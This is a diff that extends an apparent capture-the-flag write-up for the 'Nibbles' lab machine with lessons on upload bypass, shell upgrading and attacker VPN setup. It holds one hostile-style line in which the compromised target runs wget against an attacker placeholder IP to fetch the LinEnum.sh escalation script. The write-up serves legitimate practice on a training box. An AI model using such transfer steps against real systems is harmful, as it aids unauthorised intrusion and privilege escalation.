@@ -307,6 +307,7 @@ cat root.txt
 
 ## Critical Lessons Learned
 
+### Technical Exploitation Lessons
 1. **Plugin Upload Vulnerability** - File upload restrictions can be bypassed if not properly validated
 2. **Code Execution** - Even image upload fields can execute arbitrary code if validation insufficient
 3. **Credential Hints** - Configuration files and box names often hint at default/weak credentials
@@ -315,6 +316,32 @@ cat root.txt
 6. **Enumeration Tools** - Automated tools like LinEnum.sh significantly speed up privesc discovery
 7. **Python pty Module** - Essential for upgrading basic shells to interactive shells
 8. **HTTP Server** - Python's http.server is useful for transferring files to targets
+
+### Operational Security & Best Practices
+1. **VPN Connection Status** - CRITICAL: Always verify you are connected to the VPN regularly throughout an engagement. Unexpected disconnects can break exploitation chains and cause confusion.
+   - Check status: `ip addr show tun0` (verify your tun0 interface exists and has an IP)
+   - Or use: `ifconfig tun0` to verify active connection
+
+2. **File Transfer Direction Awareness** - Understand which direction files are traveling:
+   - **Attack Machine → Target Machine**: When hosting a listener (http.server, SMB server, etc.), use your **VPN IP (tun0)** on the attack machine
+   - **Target Machine → Attack Machine**: When receiving reverse shells or data, listen on your **VPN IP (tun0)**
+   - **Common Mistake**: Using `127.0.0.1`, `localhost`, or wrong IP causes file transfer failures
+   
+   **Example from Nibbles:**
+   ```bash
+   # CORRECT - Using tun0 VPN IP
+   Attack Machine: sudo python3 -m http.server 8080  (on tun0 IP)
+   Target Command: wget http://<ATTACK_tun0_IP>:8080/LinEnum.sh
+   
+   # INCORRECT - Would fail
+   Attack Machine: sudo python3 -m http.server 8080  (on 127.0.0.1)
+   Target Command: wget http://127.0.0.1:8080/LinEnum.sh  (unreachable)
+   ```
+
+3. **Script Transfer Verification**
+   - Always verify files transferred correctly: `ls -la filename`
+   - Check file integrity if needed: `md5sum filename`
+   - Verify permissions before execution: `chmod +x script.sh`
 
 ---
 
@@ -325,3 +352,5 @@ cat root.txt
 - Root flag: Retrieved ✓
 - Time: ~2 hours
 - Difficulty: Easy (accurate classification - straightforward exploitation chain)
+
+**Key Takeaway**: The combination of weak credentials, file upload exploitation, and improper sudo configuration made this a practical example of real-world vulnerabilities. The operational lesson about VPN IP usage is critical for all future engagements.
